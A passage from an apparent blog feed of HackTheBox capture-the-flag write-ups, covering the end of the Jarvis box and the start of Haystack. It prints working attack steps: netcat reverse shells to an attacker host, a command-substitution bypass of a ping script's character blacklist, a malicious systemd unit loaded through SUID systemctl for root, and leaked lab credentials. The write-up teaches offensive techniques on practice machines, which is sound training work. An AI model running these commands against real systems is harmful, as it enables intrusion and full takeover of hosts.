[INFO] the backdoor has been successfully uploaded on &#x27;/var/www/html/&#x27; - http://jarvis.htb:80/tmpbmblq.php</span></span><br><span class="line"><span class="string">[20:02:45] [INFO] calling OS shell. To quit type &#x27;x&#x27; or &#x27;q&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; id</span></span><br><span class="line"><span class="string">command standard output: &#x27;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#x27;</span></span><br></pre></td></tr></table></figure><p>Jackpot!</p><p><em>Note: We could also have used <code>--user-agent=&lt;random-ua&gt;</code> to avoid using the default <code>sqlmap</code> user agent that can get easily detected by WAF.</em></p><p>We have a PHP shell running as www-data.<br>For ease of use, I open a netcat reverse shell and close the php shell opened by SQLMap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="comment"># Back to the SQLMap/PHP reverse shell</span></span><br><span class="line">os-shell&gt; nc -e /bin/sh 10.10.10.10 8585</span><br></pre></td></tr></table></figure><p>And surely we get the connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.143:54336</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>Note: As a reminder you can use the following magic trick to upgrade your shell to a fully interactive one :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ <span class="comment"># In Attacker console</span></span><br><span class="line">[hg8@archbook ~]$ stty raw -<span class="built_in">echo</span></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line">$ <span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure><h3 id="Pivot-www-data-gt-pepper"><a href="#Pivot-www-data-gt-pepper" class="headerlink" title="Pivot www-data -&gt; pepper"></a>Pivot www-data -&gt; pepper</h3><p>Alright, so now we have shell on the <code>www-data</code> user. Let’s try to move to the user to find the first flag.</p><p>Looking around the webapp files we find the database credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:/var/www/html$ cat connection.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$connection</span>=new mysqli(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;DBadmin&#x27;</span>,<span class="string">&#x27;imissyou&#x27;</span>,<span class="string">&#x27;hotel&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>We can try to connect using the <code>phpmyadmin</code> instance:</p><p><img src="https://user-images.githubusercontent.com/9076747/67007518-e0bb6580-f0e7-11e9-9b1b-f01b364b2926.png" alt="Jarvis phpmyadmin instance"></p><p>But turn out there is nothing interesting there. Only a empty <code>flag</code> database, probably a joke by one of the users. Let’s move on.</p><p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget <span class="string">&quot;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&quot;</span> -O lse.sh</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh</span><br><span class="line">2019-10-17 08:00:49 (527 KB/s) - <span class="string">&#x27;/tmp/lse.sh&#x27;</span> saved [31736/31736]</span><br></pre></td></tr></table></figure><p>Let’s run the script to see if we can find anything intesrresting :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ bash /tmp/lse.sh</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">===================================================================( sudo )=====</span><br><span class="line">[!] sud000 Can we sudo without a password?................................. nope</span><br><span class="line">[!] sud010 Can we list sudo commands without a password?................... yes!</span><br><span class="line">---</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on jarvis:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on jarvis:</span><br><span class="line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span><br><span class="line">---</span><br><span class="line">============================================================( file system )=====</span><br><span class="line">[!] fst020 Uncommon setuid binaries........................................ yes!</span><br><span class="line">---</span><br><span class="line">/bin/systemctl</span><br><span class="line">---</span><br><span class="line">==================================( FINISHED )==================================</span><br></pre></td></tr></table></figure><p>We notice two very distinctive configurations here. First of all, the script <code>/var/www/Admin-Utilities/simpler.py</code> can be run as user <code>pepper</code> without password through sudo. This <code>simpler.py</code> script will be our entry point to pivot to the <code>pepper</code> user.</p><p>Second, we notice that <code>systemctl</code> binary at the setuid bit set. As a reminder SETUID is special permission attributes in Unix and Unix-like systems, they allow unprivileged users to run programs with elevated privileges.</p><p>Here <code>systemctl</code> will always be run at root:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /bin/systemctl</span><br><span class="line">-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl</span><br></pre></td></tr></table></figure><p>Let’s keep that in mind for the privilege escalation later.</p><p>Alright, with all of that in mind, let’s investigate this <code>simpler.py</code> script to see how we can abuse it to pivot to the <code>pepper</code> user.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py</span><br></pre></td></tr></table></figure><p>The file is owned by <code>pepper</code> user and we have no right to edit it. We will need to find a vulnerabiility in the script.</p><p>Upon opening it we can see it’s used to show statistics about attackers IP and to ping those IP.</p><p>The function to <code>ping</code> catch the attention because of the use of <code>os.system</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span>():</span></span><br><span class="line">    forbidden = [<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, <span class="string">&#x27;|&#x27;</span>]</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&#x27;Enter an IP: &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Got you&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">&#x27;ping &#x27;</span> + command)</span><br></pre></td></tr></table></figure><p><code>os.system(&#39;ping &#39; + command)</code> clearly open a command injection vulnerability. However the script author seems to be aware of the issue and blacklisted a few common characters used in command injection.</p><p>So we can’t easily inject command. But then what about command substitution ?</p><p>According to the bash manual:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man bash</span><br><span class="line">[...]</span><br><span class="line">Command Substitution</span><br><span class="line">       Command substitution allows the output of a <span class="built_in">command</span> to replace the <span class="built_in">command</span> name.  There are two forms:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              $(<span class="built_in">command</span>)</span><br><span class="line">       or</span><br><span class="line">              `<span class="built_in">command</span>`</span><br></pre></td></tr></table></figure><p> While the <code>`</code> is blacklisted, neither <code>$</code> or <code>()</code> is. Let’s try to subsitate then :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ***********************************************</span><br><span class="line">     _                 _</span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span><br><span class="line">/ __| | <span class="string">&#x27;_ ` _ \| &#x27;</span>_ \| |/ _ \ <span class="string">&#x27;__| &#x27;</span>_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span><br><span class="line">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span><br><span class="line">                |_|               |_|    |___/</span><br><span class="line">                                @ironhackers.es</span><br><span class="line"></span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(id)</span><br><span class="line">ping: groups=1000(pepper): Temporary failure <span class="keyword">in</span> name resolution</span><br></pre></td></tr></table></figure><p> Awseome, let’s use this to open a reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/sh 10.10.10.10 8544&quot;</span> &gt; /tmp/hg8.sh</span><br><span class="line">$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _</span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span><br><span class="line">/ __| | <span class="string">&#x27;_ ` _ \| &#x27;</span>_ \| |/ _ \ <span class="string">&#x27;__| &#x27;</span>_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span><br><span class="line">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span><br><span class="line">                |_|               |_|    |___/</span><br><span class="line">                                @ironhackers.es</span><br><span class="line"></span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(bash /tmp/hg8.sh)</span><br></pre></td></tr></table></figure><p>And surely enough we get our shell!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line">Connection from 10.10.10.143:57986</span><br><span class="line">pepper@jarvis:~$ id</span><br><span class="line">uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)</span><br><span class="line">pepper@jarvis:~$ cat user.txt</span><br><span class="line">2afxxxxxxxxxxxxxxc44f</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p><em>Note: To make it easier I added my ssh pub key to <code>authorized_keys</code> to connect to the <code>pepper</code> account by SSH:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa XXXXX&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>The recon phase will be quick here since we already a very valuable information in the user recon phase : <code>/bin/systemctl</code> have the SUID bit set :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /bin/systemctl</span><br><span class="line">-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl</span><br></pre></td></tr></table></figure><p>This mean that if we manage to make <code>systemctl</code> run a command for us, this one will be automatically run as root user.</p><h3 id="Systemctl-privilege-escalation"><a href="#Systemctl-privilege-escalation" class="headerlink" title="Systemctl privilege escalation"></a>Systemctl privilege escalation</h3><p>For this kind of need, <a href="https://gtfobins.github.io/">GTFOBins</a> is an incredibly useful project:</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>And surely enough, there is informations and even an example for <code>systemctl</code> :</p><blockquote><p>It runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p></blockquote><p>First we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Now let’s run the GTFO example and replace the command with our reverse shell :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ TF=$(mktemp).service</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;[Service]</span></span><br><span class="line"><span class="string">Type=oneshot</span></span><br><span class="line"><span class="string">ExecStart=/bin/sh -c &quot;nc 10.10.10.10 8585 -e /bin/bash&quot;</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target&#x27;</span> &gt; <span class="variable">$TF</span></span><br><span class="line">[hg8@archbook ~]$ systemctl link <span class="variable">$TF</span></span><br><span class="line">[hg8@archbook ~]$ systemctl <span class="built_in">enable</span> --now <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p>And since everything went fine, we get our shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.143:35734</span><br><span class="line"></span><br><span class="line">root@jarvis:/<span class="comment">#</span></span><br><span class="line">root@jarvis:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line">d41dxxxxxxxxxxxxxxx71</span><br></pre></td></tr></table></figure><p>Hope this was clear enough, as always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
            <tag> gobuster </tag>
            
            <tag> jarvis </tag>
            
            <tag> waf </tag>
            
            <tag> sql-injection </tag>
            
            <tag> sqlmap </tag>
            
            <tag> phpmyadmin </tag>
            
            <tag> cve-2018-12613 </tag>
            
            <tag> systemctl </tag>
            
            <tag> service </tag>
            
            <tag> gtfobins </tag>
            
            <tag> command-injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Haystack</title>
      <link href="/posts/haystack/"/>
      <url>/posts/haystack/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="haystack-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158099-02e7b280-9886-11ea-8799-d7f5df9a20bb.png"><p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p><p>First thing first, let’s add the box IP to the hosts file: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;10.10.10.115 haystack.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC 10.10.10.115</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 22:08 CEST</span><br><span class="line">Nmap scan report for haystack.htb (10.10.10.115)</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx 1.12.2</span><br><span class="line">9200/tcp open  http    nginx 1.12.2</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 87.23 seconds</span><br></pre></td></tr></table></figure><p>Alright nothing suprising here: SSH, HTTP and 9200 which is port used by Elasticsearch. Let’s start.</p><h3 id="Stenography"><a href="#Stenography" class="headerlink" title="Stenography"></a>Stenography</h3><p>Once opening <a href="http://haystack.htb/">http://haystack.htb</a> we are greeted with a single image.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;needle.jpg&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>gobuster</code> doesn’t find anything else interresting. So let’s check this image :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget haystack.htb/needle.jpg</span><br><span class="line">[hg8@archbook ~]$ file needle.jpg</span><br><span class="line">needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline, precision 8, 1200x803, components 3</span><br></pre></td></tr></table></figure><p>So far so good, nothing suspicious. Let’s see if we can find strings in it :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ strings needle.jpg</span><br><span class="line">[...]</span><br><span class="line">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==</span><br></pre></td></tr></table></figure><p>Let’s decode this base64 string :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&quot;</span> | base64 -d</span><br><span class="line">la aguja en el pajar es <span class="string">&quot;clave&quot;</span></span><br></pre></td></tr></table></figure><p>A hint. Let’s keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let’s move on to the Elasticsearch instance.</p><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>Opening port 9200 return the following json:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http haystack.htb:<span class="number">9200</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;cluster_name&quot;</span>: <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cluster_uuid&quot;</span>: <span class="string">&quot;pjrX7V_gSFmJY-DxP4tCQg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;iQEYHgS&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tagline&quot;</span>: <span class="string">&quot;You Know, for Search&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;build_date&quot;</span>: <span class="string">&quot;2018-09-26T13:34:09.098244Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_flavor&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_hash&quot;</span>: <span class="string">&quot;04711c2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_snapshot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;build_type&quot;</span>: <span class="string">&quot;rpm&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;lucene_version&quot;</span>: <span class="string">&quot;7.4.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_index_compatibility_version&quot;</span>: <span class="string">&quot;5.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_wire_compatibility_version&quot;</span>: <span class="string">&quot;5.6.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;number&quot;</span>: <span class="string">&quot;6.4.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p><p>We can use the <code>_cat</code> endpoint to list all indexes :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http &quot;haystack.htb:9200/_cat/indices&quot;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">.kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    2 0  14.3kb  14.3kb</span><br><span class="line">quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb</span><br><span class="line">bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb</span><br></pre></td></tr></table></figure><p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let’s search across those documents to see if we can find something interesting with our previous hint in mind.</p><p>According the the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn’t seem to return any interesting user or information. Let’s try with the <code>clave</code> keyword we found in the image :</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http <span class="string">&quot;haystack.htb:9200/_search?q=clave&quot;</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;_shards&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;failed&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;skipped&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;successful&quot;</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="attr">&quot;total&quot;</span>: <span class="number">11</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;hits&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hits&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_id&quot;</span>: <span class="string">&quot;45&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_index&quot;</span>: <span class="string">&quot;quotes&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;</span>: <span class="number">5.9335938</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;quote&quot;</span>: <span class="string">&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;_type&quot;</span>: <span class="string">&quot;quote&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_id&quot;</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_index&quot;</span>: <span class="string">&quot;quotes&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;</span>: <span class="number">5.3459888</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;quote&quot;</span>: <span class="string">&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;</span></span><br><span class="line">                